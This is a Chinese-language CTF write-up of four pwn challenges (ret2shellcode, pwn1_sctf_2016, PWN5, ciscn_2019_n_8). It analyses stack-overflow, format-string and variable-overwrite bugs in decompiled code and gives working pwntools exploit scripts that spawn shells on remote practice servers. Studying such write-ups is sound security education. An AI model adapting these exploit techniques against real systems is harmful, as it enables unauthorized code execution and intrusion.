# PWN challenges

## [NewStarCTF 公开赛赛道]ret2shellcode

这是一道ret2shellcode的题型，但是通过checksec发现启用`PIE`保护，不能在`.bss`段写入`shellcode`

> <img src="./img_c/1.png">

查看`IDA`反编译信息

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[40]; // [rsp+0h] [rbp-30h] BYREF
  void *buf; // [rsp+28h] [rbp-8h]

  init(argc, argv, envp);
  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Hello my friend.Any gift for me?");
  read(0, buf, 0x100uLL);
  puts("Anything else?");
  read(0, v4, 0x100uLL);
  puts("Ok.See you!");
  return 0;
}
```

- 第7行`mmap()`创建了一个缓冲区`buf`，大小为`0x1000`字节，重点是拥有`7`权限，即`rwx`权限

- 第9行向缓冲区`buf`中写入数据，总长度`0x100`字节
- 第11行向缓冲区`v4`写入数据，总长度`0x100`字节

根据`IDA`的分析来说，既然`buf`拥有`rwx`权限，那么我们可以向`buf`中写入`shellcode`，但是不能直接溢出`buf`，因为第一个`read()`限制了写入的数据长度`0x100`，该长度远远小于`buf`允许的最大长度`0x1000`，因此需要利用第二个`read()`，第二个`read()`写入的缓冲区`v4`仅有40字节，完全满足溢出条件

同时，`mmap()`函数也指定了缓冲区的内存地址`0x233000`，这一点也可以在`pwndbg`中验证

> <img src="./img_c/2.png">

然后计算从`v4`到`rbp`的长度

> <img src="./img_c/3.png">

从上图可以得出，从`rsp`到`rbp`共`0x30`个字节，加上`rbp`本身8字节，共需要溢出`0x38`个字节，下面是攻击脚本

```py
from pwn import *

context.arch = 'amd64'

buf_addr = 0x233000
shellcode = asm(shellcraft.amd64.sh())
payload = b'A' * 0x38 + p64(buf_addr)

io = remote('node5.buuoj.cn', 28144)
io.sendline(shellcode)
io.recv()
io.sendline(payload)
io.interactive()
```

运行脚本，得到flag

> <img src="./img_c/4.png">

## pwn1_sctf_2016

主要看`vuln()`函数

```c
int vuln()
{
  const char *v0; // eax
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
  _BYTE v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  _BYTE v4[7]; // [esp+40h] [ebp-18h] BYREF
  char v5; // [esp+47h] [ebp-11h] BYREF
  _BYTE v6[7]; // [esp+48h] [ebp-10h] BYREF
  _BYTE v7[5]; // [esp+4Fh] [ebp-9h] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);
  std::string::operator=(&input, s);
  std::allocator<char>::allocator(&v5);
  std::string::string(v4, "you", &v5);
  std::allocator<char>::allocator(v7);
  std::string::string(v6, "I", v7);
  replace(v3);
  std::string::operator=(&input, v3, v6, v4);
  std::string::~string(v3);
  std::string::~string(v6);
  std::allocator<char>::~allocator(v7);
  std::string::~string(v4);
  std::allocator<char>::~allocator(&v5);
  v0 = std::string::c_str(&input);
  strcpy(s, v0);
  return printf("So, %s\n", s);
}
```

大致内容是`fgets()`接收32字节的输入，传入`s`字符数组，然后执行替换函数`replace`，将`s`中的`I`替换为`you`，最后通过`strcpy()`将替换的结果返还`s`字符数组

这道题便是利用替换函数进行溢出，`s`位于`ebp - 0x3C`的位置，即60字节，只需要传入20个`I`，经过替换函数替换为20个`you`，然后拼接`ebp`和`ret_addr`即可，这道题的`ret_addr`是`get_flag()`函数，位于`0x08048F0D`

```c
int get_flag()
{
  return system("cat flag.txt");
}
```

因此脚本为

```py
from pwn import *

# sh = process('./pwn1_sctf_2016')
sh = remote('node5.buuoj.cn', 25308)

binsh = 0x8048F0D
payload = flat([b'I' * 20, b'aaa', binsh])
sh.sendline(payload)
sh.interactive()
```

> <img src="./img_c/5.png">

## [第五空间2019 决赛]PWN5

典型格式化字符串漏洞

```c
int __cdecl main(int a1)
{
  time_t v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 99u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```

第24行`if`判断输入等于`dword_804C044`就`getshell`，而19行`read(0, buf, 99u)`和21行`print(buf)`意味着能直接利用`buf`进行任意写

先判断偏移量

> <img src="./img_c/6.png">

> <img src="./img_c/7.png">

`esp`是格式化字符串的位置，`buf`位于`esp + 0x28`，偏移值为10

因此只需要写入`dword_804C044_addr + %10$n`，就可以将`dword_804C044`的值改为4，然后传入4即可`getshell`

```py
from pwn import *

# context.arch = 'amd64'

# sh = process('./pwn')
sh = remote('node5.buuoj.cn', 29741)

r = 0x0804C044
payload = p32(r) + b'%10$n'
sh.recv()
sh.sendline(payload)
sh.recv()
sh.sendline(str(4))
sh.interactive()
```

注意后面的判断是通过`atoi()`函数进行的，会将`str`转换为`int`，因此在传入的时候就必须是`str`

> <img src="./img_c/8.png">

## ciscn_2019_n_8

有趣的一道题

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *&var[13] )
  {
    if ( *&var[13] == 17LL )
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

这道题开启了所有保护，因此不能通过正常途径`getshell`

仔细来看代码，`scanf()`接收了`%s`到数组`var[]`，第13行`if`判断当`var[13] == 17`的时候可以直接`getshell`，也就是说只需要构造一串数据，让`scanf()`为`var[13]`赋值17即可，但这里需要注意`var[]`的数据类型

C语言中，一般的数组类型有两种，一种是`char`类型，另一种是`int`类型，`char`类型的数组每个元素只占据1字节，而`int`类型的数组每个元素需要占据4字节，我们访问`var[]`，来看看数据类型

```assembly
.bss:00004060                 public var
.bss:00004060 ; _DWORD var[15]
.bss:00004060 var             dd 0Fh dup(?)           ; DATA XREF: main+28↑o
.bss:00004060                                         ; main+56↑o ...
.bss:00004060 _bss            ends
.bss:00004060
```

很显然，`var[]`的数据类型是`_DWORD`，`_DWORD`是windows中常见的类型别名，通常定义为 `unsigned int` 或 `unsigned long`，占据4字节空间，所以，最后的exp如下

```py
from pwn import *

# context.arch = 'amd64'

sh = process('./ciscn_2019_n_8')
# sh = remote('node5.buuoj.cn', 27558)

payload = b'aaaa' * 13 + p32(17)
sh.sendline(payload)
sh.interactive()
```

